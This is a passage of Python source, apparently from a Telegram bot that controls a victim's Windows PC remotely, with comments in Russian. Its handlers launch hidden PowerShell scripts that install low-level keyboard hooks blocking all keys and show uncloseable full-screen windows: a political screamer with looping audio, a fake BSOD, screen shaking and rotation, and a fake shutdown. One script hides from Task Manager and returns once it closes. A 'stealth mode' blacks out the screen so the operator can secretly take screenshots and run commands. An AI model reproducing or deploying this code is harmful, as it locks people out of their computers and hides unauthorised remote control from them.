                script_dir = os.path.dirname(os.path.abspath(__file__))
                photo_dir = os.path.join(script_dir, "photo")
                image_path = os.path.join(photo_dir, "zela.png")
                audio_path = os.path.join(photo_dir, "zela1.mp3")
                
                # Проверяем наличие файлов
                if not os.path.exists(image_path):
                    await query.edit_message_text("❌ Не найдено изображение zela.png в папке photo/")
                    await show_back_button(query)
                    return
                
                if not os.path.exists(audio_path):
                    await query.edit_message_text("❌ Не найден аудио файл zela1.mp3 в папке photo/")
                    await show_back_button(query)
                    return
                
                # Экранируем пути
                image_path_escaped = image_path.replace('\\', '\\\\')
                audio_path_escaped = audio_path.replace('\\', '\\\\')
                
                # PowerShell скрипт с изображением, музыкой и блокировкой клавиш
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Блокировка всех клавиш
                $keyHookCode = @"
                using System;
                using System.Runtime.InteropServices;
                public class KeyHook {{
                    private const int WH_KEYBOARD_LL = 13;
                    private static IntPtr hookID = IntPtr.Zero;
                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                    
                    [DllImport("user32.dll")]
                    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
                    
                    [DllImport("kernel32.dll")]
                    private static extern IntPtr GetModuleHandle(string lpModuleName);
                    
                    public static void SetHook(LowLevelKeyboardProc proc) {{
                        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle("user32"), 0);
                    }}
                    
                    public static void Unhook() {{
                        if (hookID != IntPtr.Zero) UnhookWindowsHookEx(hookID);
                    }}
                    
                    public static IntPtr BlockAllKeys(int nCode, IntPtr wParam, IntPtr lParam) {{
                        return (IntPtr)1;  // Блокируем все клавиши
                    }}
                }}
"@
                Add-Type $keyHookCode
                
                # Функция для создания формы со скримером
                function Show-ZelenskyScreener {{
                    param($imagePath)
                    
                    # Создаем форму на весь экран
                    $form = New-Object System.Windows.Forms.Form
                    $form.FormBorderStyle = 'None'
                    $form.WindowState = 'Maximized'
                    $form.TopMost = $true
                    $form.BackColor = [System.Drawing.Color]::Black
                    $form.KeyPreview = $true
                    $form.ShowInTaskbar = $false
                    
                    # Блокируем все клавиши
                    $form.Add_KeyDown({{
                        param($s, $e)
                        $e.Handled = $true
                        $e.SuppressKeyPress = $true
                    }})
                    
                    # Загружаем изображение
                    $image = [System.Drawing.Image]::FromFile($imagePath)
                    
                    # Создаем PictureBox
                    $pictureBox = New-Object System.Windows.Forms.PictureBox
                    $pictureBox.Dock = 'Fill'
                    $pictureBox.SizeMode = 'Zoom'
                    $pictureBox.Image = $image
                    $form.Controls.Add($pictureBox)
                    
                    # Полностью блокируем закрытие
                    $form.Add_FormClosing({{
                        param($sender, $e)
                        if (-not $script:allowClose) {{
                            $e.Cancel = $true
                        }}
                    }})
                    
                    return $form, $image
                }}
                
                # Глобальные переменные
                $script:allowClose = $false
                $imagePath = "{image_path_escaped}"
                $audioPath = "{audio_path_escaped}"
                $duration = {duration}
                $volumeLevel = {volume}
                
                # Создаем и показываем форму
                $form, $image = Show-ZelenskyScreener -imagePath $imagePath
                $form.Show()
                
                # Функция для управления воспроизведением через MCI
                Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                using System.Text;
                public class MciPlayer {{
                    [DllImport("winmm.dll")]
                    private static extern int mciSendString(string command, StringBuilder returnValue, int returnLength, IntPtr hwndCallback);
                    
                    public static void Play(string file, int volume) {{
                        mciSendString("close all", null, 0, IntPtr.Zero);
                        mciSendString("open \\"" + file + "\\" type mpegvideo alias music", null, 0, IntPtr.Zero);
                        mciSendString("setaudio music volume to " + (volume * 10).ToString(), null, 0, IntPtr.Zero);
                        mciSendString("play music repeat", null, 0, IntPtr.Zero);
                    }}
                    
                    public static void Stop() {{
                        mciSendString("stop music", null, 0, IntPtr.Zero);
                        mciSendString("close music", null, 0, IntPtr.Zero);
                    }}
                }}
"@
                
                # Запускаем музыку с заданной громкостью
                [MciPlayer]::Play($audioPath, $volumeLevel)
                
                # Устанавливаем hook для блокировки ВСЕХ клавиш
                [KeyHook]::SetHook()
                
                # Запоминаем время старта
                $startTime = Get-Date
                
                # Цикл мониторинга
                while ($true) {{
                    [System.Windows.Forms.Application]::DoEvents()
                    
                    # Проверяем диспетчер задач
                    $taskmgr = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
                    
                    if ($taskmgr) {{
                        # Диспетчер запущен - скрываем и останавливаем музыку
                        if ($form.Visible) {{
                            $form.Hide()
                            [MciPlayer]::Stop()
                        }}
                    }} else {{
                        # Диспетчера нет - показываем и включаем музыку
                        if (-not $form.Visible) {{
                            $form.Show()
                            $form.TopMost = $true
                            $form.BringToFront()
                            [MciPlayer]::Play($audioPath, $volumeLevel)
                        }}
                    }}
                    
                    # Проверяем время
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    if ($elapsed -ge $duration) {{
                        break
                    }}
                    
                    Start-Sleep -Milliseconds 50
                }}
                
                # Останавливаем музыку и закрываем
                [MciPlayer]::Stop()
                [KeyHook]::Unhook()
                $script:allowClose = $true
                $form.Close()
                
                # Очистка ресурсов
                $image.Dispose()
                $form.Dispose()
                '''
                
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command])
                await query.edit_message_text(f"✅ Скример Зеленского запущен!\n\n⏱️ Время: {duration} сек\n🔊 Громкость: {volume}%\n🇺🇦 С музыкой в цикле!\n\n🔒 Закрыть невозможно!\n🚫 Все клавиши заблокированы (Win, Alt+Tab, Ctrl+Alt+Del)\n👁️ Прячется при диспетчере задач\n🔄 Возвращается при закрытии")
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("fake_bsod_"):
        # Извлекаем время из callback_data
        duration = int(action.split("_")[2])
        await query.edit_message_text(f"💀 Запускаю фейковый BSOD на {duration} секунд...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт фейкового BSOD с блокировкой всех клавиш
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Блокировка клавиш через LowLevelKeyboardProc с правильной обработкой
                $code = @"
                using System;
                using System.Runtime.InteropServices;
                using System.Windows.Forms;
                
                public class KeyboardBlocker {{
                    private const int WH_KEYBOARD_LL = 13;
                    private const int WM_KEYDOWN = 0x0100;
                    private const int WM_SYSKEYDOWN = 0x0104;
                    private const int HC_ACTION = 0;
                    private static IntPtr _hookID = IntPtr.Zero;
                    private static LowLevelKeyboardProc _proc;
                    
                    [StructLayout(LayoutKind.Sequential)]
                    public struct KBDLLHOOKSTRUCT {{
                        public int vkCode;
                        public int scanCode;
                        public int flags;
                        public int time;
                        public IntPtr dwExtraInfo;
                    }}
                    
                    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                    
                    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                    [return: MarshalAs(UnmanagedType.Bool)]
                    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
                    
                    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                    private static extern IntPtr GetModuleHandle(string lpModuleName);
                    
                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                    
                    public static void SetHook() {{
                        _proc = HookCallback;
                        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
                        using (var curModule = curProcess.MainModule) {{
                            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
                        }}
                    }}
                    
                    public static void Unhook() {{
                        if (_hookID != IntPtr.Zero) {{
                            UnhookWindowsHookEx(_hookID);
                            _hookID = IntPtr.Zero;
                        }}
                    }}
                    
                    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
                        if (nCode >= HC_ACTION) {{
                            // Блокируем ВСЕ клавиши, включая Win
                            return (IntPtr)1;  // Возвращаем 1 чтобы заблокировать
                        }}
                        return CallNextHookEx(_hookID, nCode, wParam, lParam);
                    }}
                }}
"@
                
                Add-Type $code
                
                # Создаем форму фейкового BSOD
                $form = New-Object System.Windows.Forms.Form
                $form.FormBorderStyle = 'None'
                $form.WindowState = 'Maximized'
                $form.TopMost = $true
                $form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
                $form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
                
                # Текст BSOD
                $label1 = New-Object System.Windows.Forms.Label
                $label1.Text = ":("
                $label1.Font = New-Object System.Drawing.Font("Segoe UI Light", 120, [System.Drawing.FontStyle]::Regular)
                $label1.ForeColor = [System.Drawing.Color]::White
                $label1.AutoSize = $true
                $label1.Location = New-Object System.Drawing.Point(100, 100)
                $form.Controls.Add($label1)
                
                $label2 = New-Object System.Windows.Forms.Label
                $label2.Text = "Your PC ran into a problem and needs to restart. We're`njust collecting some error info, and then we'll restart for you."
                $label2.Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Regular)
                $label2.ForeColor = [System.Drawing.Color]::White
                $label2.AutoSize = $true
                $label2.Location = New-Object System.Drawing.Point(100, 400)
                $form.Controls.Add($label2)
                
                $progressLabel = New-Object System.Windows.Forms.Label
                $progressLabel.Text = "0% complete"
                $progressLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20)
                $progressLabel.ForeColor = [System.Drawing.Color]::White
                $progressLabel.AutoSize = $true
                $progressLabel.Location = New-Object System.Drawing.Point(100, 600)
                $form.Controls.Add($progressLabel)
                
                $label3 = New-Object System.Windows.Forms.Label
                $label3.Text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode`n`nIf you call a support person, give them this info:`nStop code: CRITICAL_PROCESS_DIED"
                $label3.Font = New-Object System.Drawing.Font("Segoe UI", 16)
                $label3.ForeColor = [System.Drawing.Color]::White
                $label3.AutoSize = $true
                $label3.Location = New-Object System.Drawing.Point(100, 700)
                $form.Controls.Add($label3)
                
                # Блокировка всех событий
                $form.KeyPreview = $true
                $form.Add_KeyDown({{
                    param($s, $e)
                    $e.Handled = $true
                    $e.SuppressKeyPress = $true
                }})
                
                $script:allowClose = $false
                $form.Add_FormClosing({{
                    param($sender, $e)
                    if (-not $script:allowClose) {{
                        $e.Cancel = $true
                    }}
                }})
                
                # Устанавливаем hook для блокировки клавиш
                [KeyboardBlocker]::SetHook()
                
                # Показываем форму
                $form.Show()
                
                # Таймер для прогресса и автозакрытия
                $startTime = Get-Date
                $duration = {duration}
                $timer = New-Object System.Windows.Forms.Timer
                $timer.Interval = 100
                
                $timer.Add_Tick({{
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    $progress = [math]::Min(100, [int](($elapsed / $duration) * 100))
                    $progressLabel.Text = "$progress% complete"
                    
                    if ($elapsed -ge $duration) {{
                        [KeyboardBlocker]::Unhook()
                        $script:allowClose = $true
                        $timer.Stop()
                        $form.Close()
                    }}
                }})
                
                $timer.Start()
                
                # Запускаем форму
                [System.Windows.Forms.Application]::Run($form)
                
                # Очистка
                $timer.Dispose()
                $form.Dispose()
                '''
                
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command])
                await query.edit_message_text(f"✅ Фейковый BSOD запущен на {duration} сек!\n\n💀 Синий экран смерти\n🚫 Все клавиши заблокированы\n⏱️ Автозакрытие через {duration} сек")
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {{str(e)}}")
        await show_back_button(query)
    
    elif action.startswith("screen_shake_"):
        # Извлекаем время из callback_data
        duration = int(action.split("_")[2])
        await query.edit_message_text(f"📳 Запускаю дрожь экрана на {duration} секунд...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт с дрожью экрана и размытием
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                Add-Type -AssemblyName PresentationCore, PresentationFramework
                
                # Блокировка клавиш
                $keyHookCode = @"
                using System;
                using System.Runtime.InteropServices;
                public class KeyHook {{
                    private const int WH_KEYBOARD_LL = 13;
                    private static IntPtr hookID = IntPtr.Zero;
                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                    
                    [DllImport("user32.dll")]
                    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
                    
                    [DllImport("kernel32.dll")]
                    private static extern IntPtr GetModuleHandle(string lpModuleName);
                    
                    public static void SetHook(LowLevelKeyboardProc proc) {{
                        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle("user32"), 0);
                    }}
                    
                    public static void Unhook() {{
                        if (hookID != IntPtr.Zero) UnhookWindowsHookEx(hookID);
                    }}
                    
                    public static IntPtr BlockAllKeys(int nCode, IntPtr wParam, IntPtr lParam) {{
                        return (IntPtr)1;
                    }}
                }}
"@
                Add-Type $keyHookCode
                
                # Получаем размер экрана
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $screenWidth = $screen.Width
                $screenHeight = $screen.Height
                
                # Создаем полупрозрачную форму с размытием
                $form = New-Object System.Windows.Forms.Form
                $form.FormBorderStyle = 'None'
                $form.WindowState = 'Maximized'
                $form.TopMost = $true
                $form.BackColor = [System.Drawing.Color]::Black
                $form.Opacity = 0.3
                $form.ShowInTaskbar = $false
                
                # Блокируем закрытие
                $script:allowClose = $false
                $form.Add_FormClosing({{
                    param($sender, $e)
                    if (-not $script:allowClose) {{
                        $e.Cancel = $true
                    }}
                }})
                
                # Устанавливаем hook для блокировки клавиш
                [KeyHook]::SetHook()
                
                $form.Show()
                
                # Функция для перемещения окна (создание эффекта дрожи)
                Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class WinAPI {{
                    [DllImport("user32.dll")]
                    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
                    
                    [DllImport("user32.dll")]
                    public static extern IntPtr GetDesktopWindow();
                    
                    [DllImport("user32.dll")]
                    public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
                }}
"@
                
                $startTime = Get-Date
                $duration = {duration}
                $random = New-Object System.Random
                
                # Главный цикл дрожи
                while ($true) {{
                    [System.Windows.Forms.Application]::DoEvents()
                    
                    # Проверяем время
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    if ($elapsed -ge $duration) {{
                        break
                    }}
                    
                    # Генерируем случайные смещения для жёсткой дрожи (от -50 до +50 пикселей)
                    $offsetX = $random.Next(-50, 50)
                    $offsetY = $random.Next(-50, 50)
                    
                    # Двигаем рабочий стол (создаёт эффект дрожи всего экрана)
                    $desktop = [WinAPI]::GetDesktopWindow()
                    [WinAPI]::SetWindowPos($desktop, [IntPtr]::Zero, $offsetX, $offsetY, $screenWidth, $screenHeight, 0x0040)
                    
                    # Перерисовываем
                    [WinAPI]::InvalidateRect([IntPtr]::Zero, [IntPtr]::Zero, $true)
                    
                    # Меняем прозрачность формы для эффекта расплывчатости
                    $form.Opacity = 0.2 + ($random.NextDouble() * 0.4)
                    
                    # Небольшая задержка (чем меньше, тем быстрее дрожь)
                    Start-Sleep -Milliseconds 30
                }}
                
                # Возвращаем рабочий стол на место
                $desktop = [WinAPI]::GetDesktopWindow()
                [WinAPI]::SetWindowPos($desktop, [IntPtr]::Zero, 0, 0, $screenWidth, $screenHeight, 0x0040)
                
                # Снимаем hook и закрываем
                [KeyHook]::Unhook()
                $script:allowClose = $true
                $form.Close()
                $form.Dispose()
                '''
                
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command])
                await query.edit_message_text(f"✅ Дрожь экрана запущена на {duration} сек!\n\n📳 Жёсткая тряска экрана\n🌀 Эффект расплывчатости\n🚫 Все клавиши заблокированы\n⏱️ Автостоп через {duration} сек")
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("screen_rotate_"):
        # Извлекаем время из callback_data
        duration = int(action.split("_")[2])
        await query.edit_message_text(f"🔄 Запускаю крутилку экрана на {duration} секунд...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт с вращением экрана
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                
                # Блокировка клавиш
                $keyHookCode = @"
                using System;
                using System.Runtime.InteropServices;
                public class KeyHook {{
                    private const int WH_KEYBOARD_LL = 13;
                    private const int HC_ACTION = 0;
                    private static IntPtr hookID = IntPtr.Zero;
                    private static LowLevelKeyboardProc _proc;
                    
                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                    
                    [DllImport("user32.dll")]
                    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("kernel32.dll")]
                    private static extern IntPtr GetModuleHandle(string lpModuleName);
                    
                    public static void SetHook() {{
                        _proc = HookCallback;
                        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle("user32"), 0);
                    }}
                    
                    public static void Unhook() {{
                        if (hookID != IntPtr.Zero) {{
                            UnhookWindowsHookEx(hookID);
                            hookID = IntPtr.Zero;
                        }}
                    }}
                    
                    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
                        if (nCode >= HC_ACTION) {{
                            return (IntPtr)1;
                        }}
                        return CallNextHookEx(hookID, nCode, wParam, lParam);
                    }}
                }}
"@
                Add-Type $keyHookCode
                
                # Устанавливаем hook
                [KeyHook]::SetHook()
                
                # Функция для поворота экрана через ChangeDisplaySettingsEx
                Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                
                public class DisplayRotation {{
                    [DllImport("user32.dll")]
                    public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam);
                    
                    [DllImport("user32.dll")]
                    public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
                    
                    public const int ENUM_CURRENT_SETTINGS = -1;
                    public const int CDS_UPDATEREGISTRY = 0x01;
                    public const int DISP_CHANGE_SUCCESSFUL = 0;
                    
                    [StructLayout(LayoutKind.Sequential)]
                    public struct DEVMODE {{
                        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
                        public string dmDeviceName;
                        public short dmSpecVersion;
                        public short dmDriverVersion;
                        public short dmSize;
                        public short dmDriverExtra;
                        public int dmFields;
                        public int dmPositionX;
                        public int dmPositionY;
                        public int dmDisplayOrientation;
                        public int dmDisplayFixedOutput;
                        public short dmColor;
                        public short dmDuplex;
                        public short dmYResolution;
                        public short dmTTOption;
                        public short dmCollate;
                        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
                        public string dmFormName;
                        public short dmLogPixels;
                        public int dmBitsPerPel;
                        public int dmPelsWidth;
                        public int dmPelsHeight;
                        public int dmDisplayFlags;
                        public int dmDisplayFrequency;
                        public int dmICMMethod;
                        public int dmICMIntent;
                        public int dmMediaType;
                        public int dmDitherType;
                        public int dmReserved1;
                        public int dmReserved2;
                        public int dmPanningWidth;
                        public int dmPanningHeight;
                    }}
                    
                    public static void Rotate(int orientation) {{
                        DEVMODE dm = new DEVMODE();
                        dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
                        
                        if (EnumDisplaySettings(null, ENUM_CURRENT_SETTINGS, ref dm)) {{
                            dm.dmDisplayOrientation = orientation;
                            
                            // Меняем разрешение при повороте на 90 или 270 градусов
                            if (orientation == 1 || orientation == 3) {{
                                int temp = dm.dmPelsWidth;
                                dm.dmPelsWidth = dm.dmPelsHeight;
                                dm.dmPelsHeight = temp;
                            }}
                            
                            ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero, 0, IntPtr.Zero);
                        }}
                    }}
                }}
"@
                
                $startTime = Get-Date
                $duration = {duration}
                $rotations = @(0, 1, 2, 3)  # 0°, 90°, 180°, 270°
                $currentRotation = 0
                
                # Главный цикл вращения
                while ($true) {{
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    if ($elapsed -ge $duration) {{
                        break
                    }}
                    
                    # Поворачиваем экран
                    [DisplayRotation]::Rotate($rotations[$currentRotation])
                    
                    # Переходим к следующему повороту
                    $currentRotation = ($currentRotation + 1) % 4
                    
                    # Задержка между поворотами (1.5 секунды)
                    Start-Sleep -Milliseconds 1500
                }}
                
                # Возвращаем нормальную ориентацию (0 градусов)
                [DisplayRotation]::Rotate(0)
                
                # Снимаем hook
                [KeyHook]::Unhook()
                '''
                
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command])
                await query.edit_message_text(f"✅ Крутилка экрана запущена на {duration} сек!\n\n🔄 Экран крутится: 0° → 90° → 180° → 270° → повтор\n🚫 Все клавиши заблокированы\n⏱️ Автостоп через {duration} сек\n\n🤢 Тошнит!")
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "fake_shutdown":
        await query.edit_message_text("💻 Запускаю фейковое выключение...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт фейкового выключения
                ps_command = '''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Блокировка клавиш
                $keyHookCode = @"
                using System;
                using System.Runtime.InteropServices;
                public class KeyHook {{
                    private const int WH_KEYBOARD_LL = 13;
                    private const int HC_ACTION = 0;
                    private static IntPtr hookID = IntPtr.Zero;
                    private static LowLevelKeyboardProc _proc;
                    
                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                    
                    [DllImport("user32.dll")]
                    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("kernel32.dll")]
                    private static extern IntPtr GetModuleHandle(string lpModuleName);
                    
                    public static void SetHook() {{
                        _proc = HookCallback;
                        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle("user32"), 0);
                    }}
                    
                    public static void Unhook() {{
                        if (hookID != IntPtr.Zero) {{
                            UnhookWindowsHookEx(hookID);
                            hookID = IntPtr.Zero;
                        }}
                    }}
                    
                    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
                        if (nCode >= HC_ACTION) {{
                            return (IntPtr)1;
                        }}
                        return CallNextHookEx(hookID, nCode, wParam, lParam);
                    }}
                }}
"@
                Add-Type $keyHookCode
                
                # Устанавливаем hook
                [KeyHook]::SetHook()
                
                # Создаем полностью черную форму на весь экран
                $form = New-Object System.Windows.Forms.Form
                $form.FormBorderStyle = 'None'
                $form.WindowState = 'Maximized'
                $form.TopMost = $true
                $form.BackColor = [System.Drawing.Color]::Black
                $form.ShowInTaskbar = $false
                $form.Cursor = [System.Windows.Forms.Cursors]::Default
                
                # Прячем курсор
                [System.Windows.Forms.Cursor]::Hide()
                
                # Блокируем закрытие
                $script:allowClose = $false
                $form.Add_FormClosing({{
                    param($sender, $e)
                    if (-not $script:allowClose) {{
                        $e.Cancel = $true
                    }}
                }})
                
                # Блокируем все события клавиатуры на форме
                $form.KeyPreview = $true
                $form.Add_KeyDown({{
                    param($s, $e)
                    $e.Handled = $true
                    $e.SuppressKeyPress = $true
                }})
                
                # Показываем форму
                $form.Show()
                
                # Бесконечный цикл - работает пока не завершат процесс извне
                while ($true) {{
                    [System.Windows.Forms.Application]::DoEvents()
                    Start-Sleep -Milliseconds 100
                    
                    # Проверяем, не закрыта ли форма
                    if ($form.IsDisposed) {{
                        break
                    }}
                }}
                
                # Очистка
                [System.Windows.Forms.Cursor]::Show()
                [KeyHook]::Unhook()
                if (-not $form.IsDisposed) {{
                    $script:allowClose = $true
                    $form.Close()
                    $form.Dispose()
                }}
                '''
                
                # Запускаем процесс и сохраняем его
                FAKE_SHUTDOWN_PROCESS = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                await query.edit_message_text(
                    "✅ Фейковое выключение активировано!\n\n"
                    "💻 ПК выглядит выключенным\n"
                    "🖥️ Чёрный экран\n"
                    "🚫 Все клавиши заблокированы\n"
                    "⚡ Нажмите кнопку ниже чтобы включить обратно!\n\n"
                    "👉 Вернитесь в меню троллинга"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "fake_shutdown_stop":
        await query.edit_message_text("⚡ Включаю ПК обратно...")
        
        try:
            if FAKE_SHUTDOWN_PROCESS is not None:
                # Завершаем процесс фейкового выключения
                FAKE_SHUTDOWN_PROCESS.terminate()
                FAKE_SHUTDOWN_PROCESS.wait(timeout=3)
                FAKE_SHUTDOWN_PROCESS = None
                
                await query.edit_message_text(
                    "✅ ПК включен обратно!\n\n"
                    "🖥️ Экран вернулся к норме\n"
                    "⌨️ Клавиши разблокированы\n"
                    "🎭 Троллинг завершён!"
                )
            else:
                await query.edit_message_text("⚠️ Фейковое выключение не активно")
        except Exception as e:
            FAKE_SHUTDOWN_PROCESS = None
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "stealth_mode_on":
        await query.edit_message_text("🕵️ Активирую режим скрытого управления...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт для черного экрана БЕЗ блокировки клавиш
                ps_command = '''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Создаем полностью черную форму на весь экран
                $form = New-Object System.Windows.Forms.Form
                $form.FormBorderStyle = 'None'
                $form.WindowState = 'Maximized'
                $form.TopMost = $true
                $form.BackColor = [System.Drawing.Color]::Black
                $form.ShowInTaskbar = $false
                $form.Opacity = 1.0
                
                # НЕ блокируем закрытие - пользователь может нажать Alt+F4
                # Но форма всегда будет возвращаться на передний план
                $form.Add_Deactivate({{
                    $form.TopMost = $true
                    $form.BringToFront()
                }})
                
                # Показываем форму
                $form.Show()
                
                # Бесконечный цикл
                while ($true) {{
                    [System.Windows.Forms.Application]::DoEvents()
                    $form.TopMost = $true
                    Start-Sleep -Milliseconds 500
                    
                    if ($form.IsDisposed) {{
                        break
                    }}
                }}
                
                if (-not $form.IsDisposed) {{
                    $form.Close()
                    $form.Dispose()
                }}
                '''
                
                # Запускаем процесс и сохраняем его
                FAKE_SHUTDOWN_PROCESS = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                STEALTH_MODE = True
                
                await query.edit_message_text(
                    "✅ Режим скрытого управления активирован!\n\n"
                    "🖥️ У пользователя чёрный экран\n"
                    "⌨️ Клавиши НЕ заблокированы (пользователь может попытаться закрыть)\n"
                    "🎮 ВЫ можете управлять ПК через бот!\n\n"
                    "📸 Делайте скриншоты\n"
                    "⚡ Выполняйте команды\n"
                    "🔊 Меняйте громкость\n"
                    "😈 Запускайте троллинг\n\n"
                    "🟢 Нажмите кнопку ниже чтобы выключить режим"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "stealth_mode_off":
        await query.edit_message_text("🟢 Выключаю скрытый режим...")
        
        try:
            if FAKE_SHUTDOWN_PROCESS is not None:
                # Завершаем процесс черного экрана
                FAKE_SHUTDOWN_PROCESS.terminate()
                FAKE_SHUTDOWN_PROCESS.wait(timeout=3)
                FAKE_SHUTDOWN_PROCESS = None
                STEALTH_MODE = False
                
                await query.edit_message_text(
                    "✅ Скрытый режим выключен!\n\n"
                    "🖥️ Экран вернулся к норме\n"
                    "👀 Пользователь видит рабочий стол\n"
                    "🎭 Режим управления завершён!"
                )
            else:
                STEALTH_MODE = False
                await query.edit_message_text("⚠️ Скрытый режим не был активен")
        except Exception as e:
            FAKE_SHUTDOWN_PROCESS = None
            STEALTH_MODE = False
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("access_blocker_"):
        # Извлекаем время из callback_data
        duration = int(action.split("_")[2])
